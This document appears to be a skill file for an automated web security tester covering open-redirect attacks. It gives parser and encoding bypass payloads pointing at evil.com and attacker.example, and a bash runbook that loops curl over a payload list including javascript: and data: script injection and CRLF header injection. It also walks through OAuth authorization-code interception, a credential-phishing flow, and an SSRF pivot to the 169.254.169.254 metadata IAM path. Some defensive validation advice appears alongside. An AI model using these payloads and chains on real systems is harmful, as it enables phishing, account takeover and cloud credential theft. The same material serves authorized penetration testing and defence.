---
name: open-redirect
description: Open redirect testing for phishing pivots, OAuth token theft, and allowlist bypass
---

# Open Redirect

Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path.

## Attack Surface

**Server-Driven Redirects**
- HTTP 3xx Location

**Client-Driven Redirects**
- `window.location`, meta refresh, SPA routers

**OAuth/OIDC/SAML Flows**
- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

**Multi-Hop Chains**
- Only first hop validated

## High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors

## Reconnaissance

### Injection Points

- Params: `redirect`, `url`, `next`, `return_to`, `returnUrl`, `continue`, `goto`, `target`, `callback`, `out`, `dest`, `back`, `to`, `r`, `u`
- OAuth/OIDC/SAML: `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `state`
- SPA: `router.push`/`replace`, `location.assign`/`href`, meta refresh, `window.open`
- Headers: `Host`, `X-Forwarded-Host`/`Proto`, `Referer`; server-side Location echo

### Parser Differentials

**Userinfo**
- `https://trusted.com@evil.com` → validators parse host as trusted.com, browser navigates to evil.com
- Variants: `trusted.com%40evil.com`, `a%40evil.com%40trusted.com`

**Backslash and Slashes**
- `https://trusted.com\evil.com`, `https://trusted.com\@evil.com`, `///evil.com`, `/\evil.com`

**Whitespace and Control**
- `http%09://evil.com`, `http%0A://evil.com`, `trusted.com%09evil.com`

**Fragment and Query**
- `trusted.com#@evil.com`, `trusted.com?//@evil.com`, `?next=//evil.com#@trusted.com`

**Unicode and IDNA**
- Punycode/IDN: `truѕted.com` (Cyrillic), `trusted.com。evil.com` (full-width dot), trailing dot

### Encoding Bypasses

- Double encoding: `%2f%2fevil.com`, `%252f%252fevil.com`
- Mixed case and scheme smuggling: `hTtPs://evil.com`, `http:evil.com`
- IP variants: decimal 2130706433, octal 0177.0.0.1, hex 0x7f.1, IPv6 `[::ffff:127.0.0.1]`
- User-controlled path bases: `/out?url=/\evil.com`

## Key Vulnerabilities

### Allowlist Evasion

**Common Mistakes**
- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser

**Robust Validation**
- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes

### OAuth/OIDC/SAML

**Redirect URI Abuse**
- Using an open redirect on a trusted domain for redirect_uri enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated

### Client-Side Vectors

**JavaScript Redirects**
- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

### Reverse Proxies and Gateways

- Host/X-Forwarded-* may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (169.254.169.254, localhost)

## Exploitation Scenarios

### OAuth Code Interception

1. Set redirect_uri to `https://trusted.example/out?url=https://attacker.tld/cb`
2. IdP sends code to trusted.example which redirects to attacker.tld
3. Exchange code for tokens; demonstrate account access

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

## Operational Runbook

Once a URL param looks like it controls a redirect (`?next=`, `?redirect=`, `?return_to=`, `?callback=`), this is the canonical bypass library.

### Step 1 — confirm baseline behavior

```bash
# Does the param control a redirect at all?
curl -s -I "<TARGET>/login?next=/profile" | grep -i location

# Does it accept a full URL or only paths?
curl -s -I "<TARGET>/login?next=https://google.com" | grep -i location
# If Location: https://google.com → open redirect, no bypass needed
```

### Step 2 — bypass library

When the validator strips obvious external URLs, try each form. Run sequentially until one survives:

```bash
PARAM="next"
TARGET="<TARGET>"
EVIL="attacker.example"
PAYLOADS=(
    # Schemeless
    "//${EVIL}"
    "//${EVIL}/path"

    # Backslash separator (Chrome/Edge follow `\\` as `/`)
    "\\\\${EVIL}"
    "/\\${EVIL}"

    # @-userinfo trick (only the @-suffix is the actual host)
    "https://trusted.example.com@${EVIL}"
    "https://trusted.example.com#@${EVIL}"

    # Double slashes / dots
    "////${EVIL}"
    ".${EVIL}"
    "https:${EVIL}"
    "https:/${EVIL}"

    # URL encoding
    "%2F%2F${EVIL}"
    "/%2F${EVIL}"
    "%5C%5C${EVIL}"

    # Double URL-encoded
    "%252F%252F${EVIL}"

    # IDN homograph
    "https://xn--80ak6aa92e.com"   # apple.com (Cyrillic) etc

    # Whitespace bypass (some validators strip whitespace differently than browsers)
    " https://${EVIL}"
    "%09https://${EVIL}"   # tab
    "%0Ahttps://${EVIL}"   # newline

    # CR/LF injection (also tests header injection)
    "/%0d%0aLocation:%20https://${EVIL}"

    # Allowlist regex bypass — confusing the host parser
    "https://trusted.example.com.${EVIL}"   # subdomain trick
    "https://${EVIL}/?foo=trusted.example.com"   # query-string spoof

    # Schemes other than http(s)
    "javascript:alert(1)"
    "data:text/html,<script>alert(1)</script>"
)

for p in "${PAYLOADS[@]}"; do
    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" <<< "$p")
    loc=$(curl -s -I "${TARGET}/login?${PARAM}=${enc}" | grep -i '^location:')
    if echo "$loc" | grep -qi "${EVIL}"; then
        echo "[BYPASS] $p → $loc"
    fi
done
```

### Step 3 — multi-hop chain

```bash
# Combine a trusted-domain redirector with the open redirect on the target
# Phishing chain:
# 1. https://trusted.example.com/redirect?to=<TARGET>/login?next=//attacker
# 2. → <TARGET>/login?next=//attacker (still trusted, browser allows)
# 3. → //attacker (the open redirect fires here)
# 4. → attacker captures referrer + any forwarded cookies
```

### Step 4 — OAuth-flow exploitation

Open redirect in an OAuth `redirect_uri` is **critical** — it leaks authorization codes:

```bash
# Try a wildcard / loose redirect_uri match
curl -s -L "https://idp.example.com/oauth/authorize\
?client_id=$CLIENT&response_type=code\
&redirect_uri=https://app.example.com.evil.com/cb" 

# If the IdP accepts the suffix-confused redirect_uri,
# the victim's code lands at attacker's server.
```

### Step 5 — internal-only egress chain (SSRF pivot)

```bash
# When the open redirect is on a server-side fetcher (e.g. link unfurler)
curl -s "<TARGET>/unfurl?u=http://trusted.example.com/redirect?to=http://169.254.169.254/latest/meta-data/iam/"
# Trusted-domain validation passes → redirect fires → fetches metadata
```

### Step 6 — record evidence

Severity tiers:
- **Critical** — open redirect in OAuth `redirect_uri` (auth-code leak); open redirect on server-side fetcher chained to SSRF
- **High** — phishing chain (trusted domain → attacker page) when target's user-base is broadly phishable
- **Medium** — single-hop redirect on a low-traffic path

Document: baseline behavior, the bypass payload that worked, the resulting Location header, and the downstream attack the redirect enables.

## Testing Methodology

1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links
2. **Build test matrix** - Scheme × host × path variants and encoding/unicode forms
3. **Compare behaviors** - Server-side validation vs browser navigation results
4. **Multi-hop testing** - Trusted-domain → redirector → external
5. **Prove impact** - Credential phishing, OAuth code interception, internal egress

## Validation

1. Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
2. Show bypass of the stated validation (regex/allowlist) using canonicalization variants
3. Test multi-hop: prove only first hop is validated and second hop escapes constraints
4. For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint

## False Positives

- Redirects constrained to relative same-origin paths with robust normalization
- Exact pre-registered OAuth redirect_uri with strict verifier
- Validators using a single canonical parser and comparing post-IDNA host and scheme
- User prompts that show the exact final destination before navigating

## Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse

## Pro Tips

1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
3. In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
4. Exercise multi-hop across distinct subdomains and paths
5. For SSRF chaining, target services known to follow redirects
6. Favor allowlists of exact origins plus optional path prefixes
7. Keep a curated suite of redirect payloads per runtime (Java, Node, Python, Go)

## Summary

Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack.
